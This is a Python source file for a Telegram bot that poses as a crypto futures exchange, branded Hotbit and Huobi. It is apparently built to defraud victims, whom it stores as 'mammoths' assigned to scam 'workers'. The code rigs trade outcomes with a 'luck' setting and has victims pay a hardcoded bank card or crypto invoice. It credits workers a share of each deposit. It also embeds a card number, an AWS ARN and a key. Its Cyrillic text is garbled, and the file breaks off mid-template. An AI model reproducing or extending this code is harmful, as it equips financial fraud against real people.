
def create_mirror(token, admin_id):
    from aiogram.types import LabeledPrice
    import asyncio
    import datetime
    import json
    import logging
    import re
    import random
    import aiohttp
    from aiogram import Bot, Dispatcher, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.contrib.middlewares.logging import LoggingMiddleware
    from aiogram.dispatcher import FSMContext
    from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
    from aiogram.dispatcher.filters.state import State, StatesGroup
    from db import Worker, session, Mammoth, Futures, Withdraws,  MammonthTopUpWithCrypto
    from img import generate_profile_stats_for_worker
    from aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
    from main import API_TOKEN, support_team
    from diction import active_chats
    from config_for_bots import payout_for_admins_bot_token
    TOKEN_FOR_MAIN = API_TOKEN


    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    admin_chat_id = admin_id
    API_TOKEN = token





    def generate_number_for_futures(start_price, luck, is_increase):
    # –ù–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
        start_price = float(start_price)  # –ó–¥–µ—Å—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ 26 000

    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω–æ–µ —á–∏—Å–ª–æ –æ—Ç -10 –¥–æ 10 —Å —à–∞–≥–æ–º 0.1
        random_change = random.uniform(0, 0.10)

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å
        if random.random() * 100 <= luck:
            if is_increase:
                generated_price = start_price + ((start_price * random_change))
            else:
                generated_price = start_price - ((start_price * random_change))
        else:
            if is_increase:
                generated_price = start_price - ((start_price * random_change))
            else:
                generated_price = start_price + ((start_price * random_change))
        return generated_price


    logging.basicConfig(level=logging.DEBUG)

    bot = Bot(token=API_TOKEN)
    dp = Dispatcher(bot)
    dp.middleware.setup(LoggingMiddleware())

    @dp.message_handler(content_types=types.ContentType.SUCCESSFUL_PAYMENT)
    async def process_successful_payment(message: types.Message):
        successful_payment = message.successful_payment
        # –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–ª–∞—Ç–µ–∂–µ
        # –ù–∞–ø—Ä–∏–º–µ—Ä, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–ª–∞—Ç–µ–∂ –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —É—Å–ª—É–≥–∏ –∏–ª–∏ —Ç–æ–≤–∞—Ä—ã

        # –ú–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–≤–∞—Ä–∞—Ö –∏–∑ successful_payment –≤ —ç—Ç–æ–º –º–µ—Å—Ç–µ
        total_amount = successful_payment.total_amount
        currency = successful_payment.currency
        invoice_payload = successful_payment.invoice_payload

        # –í—ã–ø–æ–ª–Ω–∏—Ç–µ –∑–¥–µ—Å—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–∞—à–µ–≥–æ –±–∏–∑–Ω–µ—Å-–ø—Ä–æ—Ü–µ—Å—Å–∞

        # –ü—Ä–∏–º–µ—Ä: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ, —á—Ç–æ –æ–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–≤–µ–¥–µ–Ω–∞
        await message.answer("–û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–≤–µ–¥–µ–Ω–∞! –°–ø–∞—Å–∏–±–æ –∑–∞ –≤–∞—à –∑–∞–∫–∞–∑.")

    @dp.pre_checkout_query_handler(lambda query: True)
    async def process_pre_checkout_query(pre_checkout_query: types.PreCheckoutQuery):
        print('–•–£–ô–õ–û–û–û–û–û–û–û–û–û')
        await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        await bot.send_message(admin_chat_id, 'sdffdsfdf')
    class SendMessagesToOperator(StatesGroup):
        first = State()

    @dp.message_handler(lambda message:message.text == '–û–ø–µ—Ä–∞—Ç–æ—Ä —Ä–∞–∑–æ—Ä–≤–∞–ª —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –≤–∞–º–∏')
    async def refuse_connection(message: types.Message, state:FSMContext):
        await state.finish()

    from aiogram.dispatcher.filters import Command
    @dp.message_handler(Command("stop_chat"), state=SendMessagesToOperator.first)
    async def stop_chat(message: types.Message, state:FSMContext):
        if not message.from_user.id:
            await message.answer('–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–º–∞–Ω–¥—É /start')
            return
        data = await state.get_data()
        operator_id = data['operator_id']
        await state.finish()
        await message.answer('–í—ã –∑–∞–≤–µ—Ä—à–∏–ª–∏ —á–∞—Ç')
        data = {'chat_id': operator_id, 'text': f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∞–π–¥–∏ {message.from_user.id} —Ä–∞–∑–æ—Ä–≤–∞–ª —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ'}
        import requests
        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data)
        for operator, mammonth in active_chats.items():
            if active_chats.get(operator) == str(message.from_user.id):
                del active_chats[operator]
        await message.answer(f'{active_chats} 9999')
    @dp.message_handler(state=SendMessagesToOperator.first)
    async def handle_send_msgs_to_operator_state(message:types.Message, state:FSMContext):
        data = await state.get_data()
        operator_id = data['operator_id']
        import requests
        data = {'chat_id': operator_id, 'text': message.text}
        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data)
        await message.answer(active_chats)

    @dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('start_chat_with_operator'))
    async def handle_chat_with_operator(query: types.CallbackQuery):
        operator_id = query.data.split('_')[-1]
        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
        data = dict()
        data['operator_id'] = operator_id
        await state.set_data(data)
        await SendMessagesToOperator.first.set()


    def choose_duration_futures(id_field):
        duration_options = [30, 60, 120, 180]
        keyboard = InlineKeyboardMarkup()

        for duration in duration_options:
            callback_data = json.dumps({
                'id_field': id_field,
                'duration': duration

            })
            print(callback_data)
            button_text = f"{duration} —Å–µ–∫—É–Ω–¥" if duration < 60 else f"{duration // 60} –º–∏–Ω—É—Ç"
            keyboard.add(InlineKeyboardButton(button_text, callback_data=callback_data))

        return keyboard


    class NewBid(StatesGroup):
        onBid = State()


    class CryptoFutures(StatesGroup):
        first = State()

    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    for cryptocurrency in cryptocurrencies:

        print(locals())
        exec(f'''
def show_{cryptocurrency}_futures():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('–ü–æ–≤—ã—à–µ–Ω–∏–µ', callback_data='{cryptocurrency}_price_increase'), InlineKeyboardButton('–ü–æ–Ω–∏–∂–µ–Ω–∏–µ', callback_data='{cryptocurrency}_price_decrease'))
    return keyboard



        ''', locals())

        exec(f'''
@dp.callback_query_handler(lambda callback_query: callback_query.data == f'show_{cryptocurrency}_currency')
async def handler_show_{cryptocurrency}_currency(query: types.CallbackQuery):

    
    from monobank import get_crypto_price_async, fetch_usd_to_rub_currency
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    index = cryptocurrencies.index("{cryptocurrency}")
    symbol = crypto_symbols[index]
    price_in_usd = float(await get_crypto_price_async(symbol))
    price_in_rub = float(await fetch_usd_to_rub_currency()) * price_in_usd

    await query.message.answer(text = f'–¶–µ–Ω–∞ {cryptocurrency} —Å–µ–π—á–∞—Å = ' + f'{{price_in_usd:.2f}}' + 'USD' + '(~' + f'{{price_in_rub:.2f}}' + 'RUB' + ')', 
        reply_markup=show_{cryptocurrency}_futures())


''', locals())

        exec(f'''
@dp.message_handler(state = CryptoFutures.first)
async def handle_state_crypto_futures(message: types.Message, state:FSMContext):
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    data = await state.get_data()
    cryptocurrency = data['cryptocurrency']
    if data['is_increase'] == 'decrease':
        is_increase = False
    else:
        is_increase = True     

    pool = float(message.text)

    from monobank import get_crypto_price_async
    price_in_usd = await get_crypto_price_async(crypto_symbols[cryptocurrencies.index(cryptocurrency)])
    balance = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id ).first().balance
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
    if mammonth.min_input_output_amount_value  <= float(pool) <= 250000:
        if (float(pool) <= balance):
            balance = balance - pool
            session.commit()
            template = f"""
    üî∏ *{{cryptocurrency}}/USD*
    üí∏ –ë–∞–ª–∞–Ω—Å: *{{balance}}* RUB

    üí± –í–∞–ª—é—Ç–∞: {{crypto_symbols[cryptocurrencies.index(cryptocurrency)]}}

    üí∞ –°—É–º–º–∞ –ø—É–ª–∞: {{pool}} RUB

    üí∏ –ù–∞—á–∞–ª—å–Ω–∞—è —Ü–µ–Ω–∞: {{price_in_usd}} USD

        """

            
            chat_id = message.chat.id

            new_field_in_futures = Futures(
            chat_id = chat_id, 
            user_id = message.from_user.id, 
            cryptosymbol=crypto_symbols[cryptocurrencies.index(cryptocurrency)], 
            pool = pool,
            start_price = price_in_usd,
            is_increase = is_increase
            )
            
            session.add(new_field_in_futures)
            session.commit()
            
            msg = await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup = choose_duration_futures(id_field =new_field_in_futures.id ))
            new_field_in_futures.message_id = msg.message_id
            session.commit()
            
            await state.finish()
        else:
            await message.answer('–°—É–º–º–∞ –ø—É–ª–∞ –±–æ–ª—å—à–µ —á–µ–º –≤–∞—à –±–∞–ª–∞–Ω—Å')
            await state.finish()
    else:
        await message.answer(f'–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç {{mammonth.min_input_output_amount_value}} –¥–æ 250.000!')
        await state.finish()

    
        await message.answer(f'–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç {{mammonth.min_input_output_amount_value }} –¥–æ 250.000!')

 

        ''', locals())

        exec(f'''

@dp.callback_query_handler(lambda callback_query: callback_query.data == '{cryptocurrency}_price_increase' or callback_query.data== '{cryptocurrency}_price_decrease')
async def handler_{cryptocurrency}_price_futures(query: types.CallbackQuery): 
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
    data = dict()
    data['cryptocurrency'] = '{cryptocurrency}'
    data['is_increase'] = query.data.split('_')[2]
    await state.set_data(data) 
    await query.message.answer('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø—É–ª–∞')
    await CryptoFutures.first.set()

''', locals())


    def top_up_balance():
        return InlineKeyboardMarkup().add(InlineKeyboardButton('–ü–æ–ø–æ–ª–Ω–∏—Ç—å', callback_data='top_up_balance')).add(InlineKeyboardButton('–í—ã–≤–µ—Å—Ç–∏',
                                                                                                                                      callback_data='withdraw'))


    def top_up_balance_by_card():
        return InlineKeyboardMarkup().add(InlineKeyboardButton('–ë–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞', callback_data='top_up_balance_by_card')).add(InlineKeyboardButton("""–ü–æ–ø–æ–ª–Ω–∏—Ç—å 
        –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π""", callback_data='top_up_balance_by_crypto'))


    def show_choose_currency():
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(InlineKeyboardButton('Bitcoin', callback_data='show_bitcoin_currency'), InlineKeyboardButton('Bitcoin Cash', callback_data='show_bitcoin_cash_currency'))
        keyboard.add(InlineKeyboardButton('Ripple', callback_data='show_ripple_currency'), InlineKeyboardButton('Doge', callback_data='show_doge_currency'))
        keyboard.add(InlineKeyboardButton('Ethereum', callback_data='show_ethereum_currency'), InlineKeyboardButton('Binance Coin',
                                                                                                                  callback_data='show_binance_coin_currency'))
        keyboard.add(InlineKeyboardButton('Litecoin', callback_data='show_litecoin_currency'), InlineKeyboardButton('Terra', callback_data='show_terra_currency'))
        keyboard.add(InlineKeyboardButton('Solana', callback_data='show_solana_currency'), InlineKeyboardButton('TRON', callback_data='show_tron_currency'))
        keyboard.add(InlineKeyboardButton('Cardano', callback_data='show_cardano_currency'), InlineKeyboardButton('Polkadot', callback_data='show_polkadot_currency'))
        keyboard.add(InlineKeyboardButton("Polygon", callback_data='show_polygon_currency'), InlineKeyboardButton('Monero', callback_data='show_monero_currency'))
        keyboard.add(InlineKeyboardButton('Euro', callback_data='show_euro_currency'))
        return keyboard


    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    portfolio = KeyboardButton('–ü–æ—Ä—Ç—Ñ–µ–ª—å üìÇ')
    open_ecn = KeyboardButton('–û—Ç–∫—Ä—ã—Ç—å ECN üíπ')
    info = KeyboardButton('–ò–Ω—Ñ–æ ‚Ñπ')
    support = KeyboardButton('–¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞ üåê')

    markup.add(portfolio)
    markup.add(open_ecn)
    markup.add(info, support)

    class WithdrawStates(StatesGroup):
        first = State()
        second = State()
    class PortfolioStates(StatesGroup):
        ShowPortfolio = State()


    class TopUpBalance(StatesGroup):
        WaitingForSum = State()
        WaitingForSumCrypto = State()


    @dp.message_handler(commands=['start'])
    async def send_welcome(message: types.Message):
        first_name = message['from']['first_name']
        template = f"""
*–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é, {first_name}*

–≠—Ç–æ —Ç–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç –∫—Ä–∏–ø—Ç–æ–ø–ª–∞—Ç—Ñ–æ—Ä–º—ã Hotbit  –¥–ª—è —Ç–æ—Ä–≥–æ–≤–ª–∏ –Ω–∞ —Ñ—å—é—á–µ—Ä—Å–∞—Ö. –ê —Ç–∞–∫–∂–µ –±—ã—Å—Ç—Ä—ã–π –∏ –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.



    """

        if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.reply(template, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
            from random import randrange
            new_mammonth = Mammoth(telegram_id=message.from_user.id, belongs_to_worker=admin_chat_id, first_name=message.from_user.first_name, service_id = randrange(
                100000, 999999) )
            worker = session.query(Worker).filter(Worker.telegram_id == admin_chat_id).first()
            worker.mammonts += f'{message.from_user.id},'
            session.add(worker)
            session.add(new_mammonth)
            session.commit()
        else:
            await message.answer('‚ö°', reply_markup=markup)
            await showportfolio(message)


    @dp.message_handler(lambda message: message.text == '–ü–æ—Ä—Ç—Ñ–µ–ª—å üìÇ')
    async def portfolio_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer("‚ö°")
            await showportfolio(message)
        else:
            await message.answer('–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–º–∞–Ω–¥—É /start')

    @dp.message_handler(lambda message: message.text == '–û—Ç–∫—Ä—ã—Ç—å ECN üíπ')
    async def open_ecn_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            currencies = await show_all_currencies()
            await message.answer(currencies, reply_markup=show_choose_currency())
        else:
            await message.answer('–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–º–∞–Ω–¥—É /start')

    @dp.message_handler(lambda message: message.text == '–ò–Ω—Ñ–æ ‚Ñπ')
    async def info_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer("–í—ã –≤—ã–±—Ä–∞–ª–∏ –ò–Ω—Ñ–æ ‚Ñπ")
        else:
            await message.answer('–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–º–∞–Ω–¥—É /start')

    @dp.message_handler(lambda message: message.text == '–¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞ üåê')
    async def support_handler(message: types.Message):
        if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer('–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–º–∞–Ω–¥—É /start')
            return
        await message.answer("–û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞. –° –≤–∞–º–∏ –¥–æ–ª–∂–µ–Ω —Å–≤—è–∑–∞—Ç—å—Å—è –æ–ø–µ—Ä–∞—Ç–æ—Ä –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è üåê")
        import requests
        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "–û–±—Ä–∞–±–æ—Ç–∞—Ç—å –º–∞–º–æ–Ω—Ç–∞", "callback_data": f"open_support_case_with_mammonth_{message.from_user.id}"},

                ]
            ]

        }
        for unit in support_team:
            data = {
                "chat_id": unit,
                "text": f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ö–æ—á–µ—Ç –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫—É! –ê–π–¥–∏ —é–∑–µ—Ä–∞ {message.from_user.id}",
                "reply_markup": inline_keyboard
            }
            requests.post(f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', json = data)


    async def check_is_paid(uuid, message:types.Message):
        from monobank import cryptomus
        while True:
            invoice_data = await cryptomus(data={'uuid':uuid},url='https://api.cryptomus.com/v1/payment/info')
            if invoice_data['result']['payment_status'] in ('paid', 'paid_over'):
                await message.answer("–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–∏–ª–∏ —Å–≤–æ–π –±–∞–ª–∞–Ω—Å.")
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

                worker = session.query(Worker).filter(Worker.telegram_id == mammonth.belongs_to_worker).first()
                from  monobank import fetch_usd_to_rub_currency
                usd_to_rub = await fetch_usd_to_rub_currency()
                await bot.send_message(worker.telegram_id, f'''–ú–∞–º–º–æ–Ω—Ç –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π –Ω–∞ {invoice_data["result"]["amount"]} USD. –í–∞—à –ø—Ä–æ—Ñ–∏—Ç –∏ –±–∞–ª–∞–Ω—Å 
                –±—ã–ª–∏ –ø–æ–ø–æ–ª–Ω–µ–Ω—ã''')
                mammonth.balance += usd_to_rub*invoice_data["result"]["amount"]
                worker.profit += usd_to_rub*invoice_data["result"]["amount"]
                worker.profit_quantity += 1
                worker.balance += usd_to_rub*invoice_data["result"]["amount"]
                if not mammonth.was_using_support:
                    worker.balance += (usd_to_rub*invoice_data["result"]["amount"])*0.8
                else:
                    worker.balance += (usd_to_rub * invoice_data["result"]["amount"])*0.6
                top_up_application = session.query(MammonthTopUpWithCrypto).filter(MammonthTopUpWithCrypto.uuid == uuid).first
                session.delete(top_up_application)
                session.commit()

                return
            else:
                print("Invoice is not paid for yet")

            await asyncio.sleep(10)

    @dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSumCrypto)
    async def waiting_for_sum__crypto_handler(message: types.Message, state: FSMContext):
        amount = float(message.text)
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        if not (mammonth.min_input_output_amount_value <= amount <= 250000):
            await message.answer('–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 2000 –¥–æ 250000 —Ä—É–±–ª–µ–π. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É.')
        else:

            last_record = session.query(MammonthTopUpWithCrypto).order_by(MammonthTopUpWithCrypto.order_id.desc()).first()
            try:

                if not last_record or last_record.order_id < 128:
                    from monobank import fetch_usd_to_rub_currency, cryptomus
                    import uuid
                    usd_to_rub = float(await fetch_usd_to_rub_currency())
                    order_id = str(uuid.uuid4())
                    invoice_data = {
                    "amount": f"{amount / usd_to_rub}",
                    "currency": "USD",
                    "order_id": last_record.order_id+1,
                    'accuracy_payment_percent': 1
                }
                    resp = await cryptomus(invoice_data, 'https://api.cryptomus.com/v1/payment')
                    uuid = resp['result']['uuid']
                    new_top_up_application = MammonthTopUpWithCrypto(amount=amount, cryptomus_link=resp['result']['url'], uuid=uuid)
                    session.add(new_top_up_application)
                    session.commit()

                    await message.answer('–í–∞—à –æ—Ä–¥–µ—Ä –ø—Ä–∏–Ω—è—Ç!', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('–û–ø–ª–∞—Ç–∏—Ç—å', url=resp['result']['url'])))
                    await check_is_paid(uuid, message)
                else:
                    await message.answer('–í–∞—à –æ—Ä–¥–µ—Ä –Ω–µ –ø—Ä–∏–Ω—è—Ç. –°–∏—Å—Ç–µ–º–∞ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç !')
            except AttributeError:
                await message.answer('–í–∞—à –æ—Ä–¥–µ—Ä –Ω–µ –ø—Ä–∏–Ω—è—Ç. –°–∏—Å—Ç–µ–º–∞ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç !')

    @dp.message_handler(lambda message: not (2000 <= int(message.text) <= 250000), state=TopUpBalance.WaitingForSum)
    async def waiting_for_sum_out_of_range(message: types.Message):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        await message.reply(f"–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç {mammonth.min_input_output_amount_value} –¥–æ 250000 —Ä—É–±–ª–µ–π. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É.")



    @dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSum)
    async def waiting_for_sum_handler(message: types.Message, state: FSMContext):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        if not (mammonth.min_input_output_amount_value <= float(message.text) <= 250000):
            await message.reply(f"–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç {mammonth.min_input_output_amount_value} –¥–æ 250000 —Ä—É–±–ª–µ–π. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É.")
            return
        await  message.answer(f'''–ë–æ—Ç –æ–∂–∏–¥–∞–µ—Ç –ø–µ—Ä–µ–≤–æ–¥–∞  –Ω–∞ –∫–∞—Ä—Ç—É `4441114419894785` –≤ —Ç–µ—á–µ–Ω–∏–∏ 15 –º–∏–Ω—É—Ç
        –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ö –ü–ï–†–ï–í–û–î–£ –î–û–ë–ê–í–ò–¢–¨ –í –û–ü–ò–°–ê–ù–ò–ò –¢–ï–ö–°–¢ –ù–ò–ñ–ï
        `{mammonth.service_id}`
        –û–¢–ü–†–ê–í–õ–Ø–¢–¨ –î–ï–ù–¨–ì–ò –û–î–ù–ò–ú –ü–õ–ê–¢–ï–ñ–Å–ú –ò–ù–ê–ß–ï –ë–ê–õ–ê–ù–° –ù–ï –ë–£–î–ï–¢ –ü–û–ü–û–õ–ù–Å–ù
        –ë–ê–õ–ê–ù–° –°–ß–ò–¢–ê–ï–¢–°–Ø –ü–û–ü–û–õ–ù–ï–ù–ù–´–ú –ï–°–õ–ò –í–´ –û–¢–ü–†–ê–í–ò–õ–ò –ü–ï–†–ï–í–û–î –ù–ê –ö–ê–†–¢–£ –°–£–ú–ú–û–ô –ù–ï –ú–ï–ù–ï–ï *{float(message.text)*0.95} RUB*''', parse_mode=ParseMode.MARKDOWN)
        title = "–ü–æ–ø–æ–ª–Ω–∏—Ç—å —Å—á–µ—Ç"
        description = "–ü–æ–ø–æ–ª–Ω–∏—Ç—å —Å—á–µ—Ç –Ω–∞ –±–∏—Ä–∂–µ Huobi"
        payload = "custom_payload"  # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        start_parameter = "start_param"  # –£–Ω–∏–∫–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –Ω–∞—á–∞–ª–∞ –æ–ø–ª–∞—Ç—ã


        message_attributes = {
        'WorkerId': {
            'DataType': 'Number',
            'StringValue': f'{admin_chat_id}'
        },
        'MammonthId': {
            'DataType': 'Number',
               'StringValue': f'{message.from_user.id}'
        },
        'Sum': {
            'DataType': 'Number',
            'StringValue': f'{message.text}'
        },
        'FirstName': {
            'DataType': 'String',
            'StringValue': f'{message.from_user.first_name}'
        },
    }
        sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:NewApplications',

                Message=f'''NewApplicationToTopUp''', MessageAttributes=message_attributes

                )
        await state.finish()
        from monobank import waiting_for_mamont_async
        from datetime import datetime, timedelta
        from math import floor
        current_datetime = datetime.now()



        await waiting_for_mamont_async(current_datetime, float(message.text), 'u3dL8d8BJIbUvxNFME1wIOOGdb6BDWUlnX3_Zc9976dc', service_id=mammonth.service_id,
                                       message=message)


    async def show_all_currencies():
        output = ' '
        from monobank import fetch_usd_to_rub_currency
        usd_to_rub = await fetch_usd_to_rub_currency()
        for symbol in crypto_symbols:
            from monobank import get_crypto_price_async
            price_usd = await get_crypto_price_async(symbol)

            if price_usd:

                price_rub = float(price_usd) * float(usd_to_rub)
                output += f"üî∏ {symbol}/USD - {float(price_usd):.2f} USD (~ {float(price_rub):.2f} RUB)\n"

            else:
                 output += f"üî∏ {symbol}/USD - –ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ\n"
        return output


    async def showportfolio(message: types.Message):
        user = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

        template = f"""
üìÇ –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
*‚ö†Ô∏è –ù–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω*
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
